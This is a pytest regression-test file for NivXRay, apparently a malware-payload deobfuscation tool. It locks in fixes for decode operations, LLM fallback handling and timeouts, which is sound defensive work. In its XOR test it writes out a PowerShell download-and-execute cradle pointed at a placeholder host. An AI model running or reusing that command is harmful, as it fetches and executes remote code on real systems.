"""
NivXRay — Regression Lock (session Feb 2026)

Every test in this file corresponds to ONE previously-fixed bug. If any
test starts failing, we've regressed a known-good behaviour. Run before
every deploy:

    cd /app && pytest -o addopts= backend/tests/test_regression_lock.py -v

Each test is fast (<2s), offline, and independent of the LLM / network.
"""
from __future__ import annotations
import base64
import sys

import pytest

sys.path.insert(0, "/app/backend")


# ═════════════════════════════════════════════════════════════════════════
# LOCK 1 · `hex-or-b64-decode` MUST be a registered op
# Original bug: Unknown operation error in recipe replay
# Fix: operations.py registered @op("hex-or-b64-decode", …)
# ═════════════════════════════════════════════════════════════════════════
def test_lock1_hex_or_b64_decode_registered():
    from operations import OPERATIONS, run_operation
    assert "hex-or-b64-decode" in OPERATIONS, "Regressed: hex-or-b64-decode is no longer registered"
    out = run_operation("hex-or-b64-decode", "48656c6c6f")  # hex('Hello')
    assert "Hello" in out, f"hex path broken, got: {out!r}"


# ═════════════════════════════════════════════════════════════════════════
# LOCK 2 · `xor-bruteforce-256` MUST be a registered op AND auto-detect
#           UTF-16LE so PowerShell -enc payloads don't mojibake
# ═════════════════════════════════════════════════════════════════════════
def test_lock2_xor_bruteforce_256_utf16le_clean():
    from operations import OPERATIONS, run_operation
    assert "xor-bruteforce-256" in OPERATIONS

    pt = 'powershell -nop -c IEX (New-Object Net.WebClient).DownloadString("http://x/y.ps1")'
    xored = bytes(b ^ 0x54 for b in pt.encode("utf-16-le"))
    out = run_operation("xor-bruteforce-256", xored.decode("latin-1"))
    assert "powershell" in out, f"UTF-16LE not decoded — mojibake regressed: {out[:80]!r}"


# ═════════════════════════════════════════════════════════════════════════
# LOCK 3 · L3 LLM synthetic op-name filter — Claude-invented op names
#           like `case-obfuscation-normalization` MUST be aliased or dropped,
#           never shown as red "Unknown operation" ERROR
# ═════════════════════════════════════════════════════════════════════════
def test_lock3_llm_op_alias_map():
    # The alias map is embedded inside llm_decoder.llm_decode_fallback().
    # Verify its two documented aliases still exist by reading the source.
    src = open("/app/backend/llm_decoder.py").read()
    assert '"case-obfuscation-normalization":  "cmd-deobfuscate"' in src, \
        "Regressed: case-obfuscation-normalization → cmd-deobfuscate alias removed"
    assert '"case_obfuscation_normalization":  "cmd-deobfuscate"' in src


# ═════════════════════════════════════════════════════════════════════════
# LOCK 4 · Dedicated-loop deadlock fix — llm_decoder must NOT use
#           run_coroutine_threadsafe (was root cause of backend hangs)
# ═════════════════════════════════════════════════════════════════════════
def test_lock4_no_deadlocking_coroutine_threadsafe():
    """Real call sites only — the string may appear in the fix docstring."""
    import ast
    src = open("/app/backend/llm_decoder.py").read()
    tree = ast.parse(src)
    calls = [
        n for n in ast.walk(tree)
        if isinstance(n, ast.Call)
        and (
            (isinstance(n.func, ast.Attribute) and n.func.attr == "run_coroutine_threadsafe")
            or (isinstance(n.func, ast.Name) and n.func.id == "run_coroutine_threadsafe")
        )
    ]
    assert not calls, "Regressed: run_coroutine_threadsafe called — will deadlock under load"
    assert "_run_async_on_dedicated_loop" in src, "Regressed: dedicated-loop helper removed"


# ═════════════════════════════════════════════════════════════════════════
# LOCK 5 · Reasoning `.slice` guard on frontend — dict-shaped reasoning
#           must not crash the Workspace
# ═════════════════════════════════════════════════════════════════════════
def test_lock5_frontend_reasoning_slice_guard():
    src = open("/app/frontend/src/pages/WorkspacePage.jsx").read()
    assert "typeof _raw === \"string\"" in src, \
        "Regressed: WorkspacePage no longer guards reasoning shape"
    # The original brittle call MUST NOT be present without a guard
    assert "r.data.reasoning.slice(0, 120)" not in src, \
        "Regressed: unguarded r.data.reasoning.slice(...) is back"


# ═════════════════════════════════════════════════════════════════════════
# LOCK 6 · `/battery` route must include the Header
# ═════════════════════════════════════════════════════════════════════════
def test_lock6_battery_page_has_header():
    src = open("/app/frontend/src/pages/MultiLayerBatteryPage.jsx").read()
    assert "import Header from \"@/components/Header\"" in src
    assert "<Header />" in src, "Regressed: /battery no longer renders Header — users lose nav"


# ═════════════════════════════════════════════════════════════════════════
# LOCK 7 · Analyse SLA — /api/analyze must wrap AI + OSINT in asyncio.wait_for
#           (was root cause of Cloudflare 524 in prod)
# ═════════════════════════════════════════════════════════════════════════
def test_lock7_analyze_has_wait_for_timeouts():
    src = open("/app/backend/routers/analyze.py").read()
    assert "asyncio.wait_for(enrich_iocs" in src, \
        "Regressed: OSINT leg unwrapped — can hang route"
    assert "asyncio.wait_for(\n                    ai_describe_and_verdict" in src or \
           "wait_for(ai_describe_and_verdict" in src.replace("\n", " "), \
        "Regressed: AI leg in /analyze unwrapped — can hang route"
    core = open("/app/backend/analysis_core.py").read()
    assert "asyncio.wait_for(enrich_iocs" in core
    assert "wait_for" in core and "ai_describe_and_verdict" in core


# ═════════════════════════════════════════════════════════════════════════
# LOCK 8 · llm_json empty-response retry — deps.py must retry >=2 times
#           with backoff when Claude returns empty
# ═════════════════════════════════════════════════════════════════════════
def test_lock8_llm_json_empty_retry():
    src = open("/app/backend/deps.py").read()
    assert "retries: int = 2" in src, \
        "Regressed: llm_json retries reverted to <2 — empty-response 502s will return"
    assert "empty response from LLM" in src, \
        "Regressed: empty-response detection removed"


# ═════════════════════════════════════════════════════════════════════════
# LOCK 9 · PREDICT TREE never returns bare `(insufficient)` when the
#           payload has decodable evidence — heuristic fallback must fire
# ═════════════════════════════════════════════════════════════════════════
def test_lock9_predict_tree_heuristic_fallback_wired():
    src = open("/app/backend/training/predictor.py").read()
    assert "_heuristic_tree" in src, "Regressed: heuristic tree helper removed"
    # Confirm it's actually WIRED (all 3 error branches must use it, not _insufficient)
    assert "return _heuristic_tree(raw, decoded, f\"LLM upstream unavailable" in src
    assert "return _heuristic_tree(raw, decoded, f\"LLM error" in src
    assert "return _heuristic_tree(raw, decoded, \"LLM returned malformed JSON\")" in src


# ═════════════════════════════════════════════════════════════════════════
# LOCK 10 · BLIND_XOR banner must smart-render PE / UTF-16LE / UTF-8
#            (was showing `MZFTØ DYØtØ LØWLØ…` mojibake before)
# ═════════════════════════════════════════════════════════════════════════
def test_lock10_blind_xor_smart_render_pe_binary():
    """Direct handler call with an XOR'd PE header must return a summary
    banner, NOT mojibake."""
    from wrapper_archetypes import _handle_blind_xor
    import base64 as _b64
    # Craft: PE header bytes 4D 5A ... base64-encoded then XOR'd with 0x54
    pe = bytes.fromhex("4d5a90000300000004000000ffff0000b8000000")
    xored = bytes(b ^ 0x54 for b in pe)
    encoded = _b64.b64encode(xored).decode()
    out = _handle_blind_xor(encoded)
    # We accept either: (a) smart-render banner, (b) unchanged input if the
    # xor scorer rejects it. Either is fine — what MUST NOT happen is a
    # mojibake `Ø`-run.
    mojibake = sum(1 for c in out if 0x80 <= ord(c) < 0xa0)
    assert mojibake < 20, f"Regressed: BLIND_XOR banner has {mojibake} mojibake chars"


# ═════════════════════════════════════════════════════════════════════════
# LOCK 11 · X-RAY SALVAGE downgrade — mid-chain BROKEN/MIXED must
#            downgrade to SALVAGED when downstream recovered
# ═════════════════════════════════════════════════════════════════════════
def test_lock11_xray_salvage_downgrade_wired():
    src = open("/app/frontend/src/components/DecodingTracePanel.jsx").read()
    assert "SALVAGED" in src, "Regressed: SALVAGED badge removed"
    assert "_rawLayerHealth" in src, "Regressed: raw-vs-salvaged split removed"


# ═════════════════════════════════════════════════════════════════════════
# LOCK 12 · Multi-Layer Battery pytest still passes 12/12
# ═════════════════════════════════════════════════════════════════════════
def test_lock12_multilayer_battery_still_green():
    import json
    report = json.load(open("/app/backend/tests/reports/multilayer_battery.json"))
    assert report["passed"] == report["total"], \
        f"Regressed: battery no longer 100% — {report['passed']}/{report['total']}"
    assert report["total"] >= 12
